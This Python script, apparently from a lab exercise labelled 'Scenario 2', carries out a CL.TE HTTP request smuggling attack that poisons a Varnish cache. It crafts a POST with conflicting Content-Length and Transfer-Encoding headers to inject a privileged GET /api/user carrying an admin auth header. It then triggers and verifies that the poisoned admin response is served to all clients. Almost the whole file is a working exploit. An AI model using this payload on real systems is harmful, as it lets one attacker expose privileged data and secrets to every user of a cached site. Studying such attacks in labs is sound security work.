import os
import socket
import time

TARGET_HOST = os.environ.get("TARGET_HOST", "localhost")
TARGET_PORT = int(os.environ.get("TARGET_PORT", "80"))


def send_request(raw):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(raw.encode("ascii"))
    data = s.recv(65535)
    s.close()
    return data.decode("iso-8859-1", errors="replace")


def is_cache_hit(resp_text):
    """CACHE HIT: X-Varnish has two numbers (e.g. '32777 11') or Age > 0."""
    headers, _, body = resp_text.partition("\r\n\r\n")
    age_val = None
    x_varnish = ""
    for line in headers.split("\r\n"):
        if line.lower().startswith("age:"):
            try:
                age_val = int(line.split(":", 1)[1].strip())
            except (ValueError, IndexError):
                pass
        if line.lower().startswith("x-varnish:"):
            x_varnish = line.split(":", 1)[1].strip() if ":" in line else ""
    # Varnish hit: header often has two IDs (e.g. "32777 11")
    two_ids = len(x_varnish.split()) >= 2 and all(
        p.strip().isdigit() for p in x_varnish.split()[:2]
    )
    return two_ids or (age_val is not None and age_val > 0)


def print_cache_status(resp_text, label=""):
    headers, _, body = resp_text.partition("\r\n\r\n")
    age = ""
    x_varnish = ""
    for line in headers.split("\r\n"):
        if line.lower().startswith("age:"):
            age = line
        if line.lower().startswith("x-varnish:"):
            x_varnish = line
    hit = is_cache_hit(resp_text)
    poisoned = "ADMIN" in body or "secret_key" in body or "PRIVILEGED" in body
    if hit and poisoned:
        hit_or_miss = "CACHE HIT (POISONED)"
    elif hit:
        hit_or_miss = "CACHE HIT"
    else:
        hit_or_miss = "CACHE MISS"
    print(f"[{label}] {hit_or_miss}")
    if age:
        print(f"    {age}")
    if x_varnish:
        print(f"    {x_varnish}")
    print("    Body preview:", body[:200].replace("\n", " "))


def build_smuggling_post_for_poison():
    """
    Smuggle a privileged GET /api/user (no query string) with X-Admin-Auth into the backend.
    The backend returns admin-flavoured JSON which Varnish then caches
    under the path-only /api/user cache key.
    """
    smuggled = (
        "GET /api/user HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Admin-Auth: secret-token\r\n"
        "\r\n"
    )

    chunked_body = "1\r\nX\r\n0\r\n\r\n"
    body = chunked_body + smuggled
    content_length = len(body)

    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {content_length}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{body}"
    )
    return request


def main():
    print("=== Scenario 2: Cache Poisoning via Request Smuggling ===")

    # STEP 1 - Verify clean cache
    print("\n[STEP 1] Checking clean cache with GET /api/user?id=guest")
    clean_req = (
        "GET /api/user?id=guest HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    resp1 = send_request(clean_req)
    print(resp1)
    print_cache_status(resp1, label="STEP 1")

    # STEP 2 - Send smuggling payload
    print("\n[STEP 2] Sending CL.TE smuggling POST to inject privileged GET /api/user")
    smuggle_post = build_smuggling_post_for_poison()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(smuggle_post.encode("ascii"))
    resp2 = s.recv(65535).decode("iso-8859-1", errors="replace")
    print("\n--- Response to smuggling POST ---")
    print(resp2)

    print("\n[STEP 2] Waiting 1s before trigger request (ensure smuggled bytes buffered).")
    time.sleep(1.0)

    # STEP 3 - Trigger smuggled request
    print("\n[STEP 3] Triggering smuggled /api/user by sending benign GET /api/user")
    trigger_req = (
        "GET /api/user HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    resp3 = send_request(trigger_req)
    print("\n--- Response to trigger GET /api/user ---")
    print(resp3)
    print_cache_status(resp3, label="STEP 3")

    # STEP 4 - Verify poisoning worked
    print("\n[STEP 4] Verifying cache poisoning with 3 more GET /api/user requests")
    for i in range(1, 4):
        r = send_request(trigger_req)
        print(f"\n--- Response #{i} to GET /api/user ---")
        print(r)
        print_cache_status(r, label=f"STEP 4 - Request {i}")

    print(
        "\nIf poisoning succeeded, the responses for /api/user should now contain\n"
        "admin-like data (role: admin, secret_key, etc.) and show cache headers\n"
        "indicating that Varnish is serving the poisoned response to all clients.\n"
    )


if __name__ == "__main__":
    main()

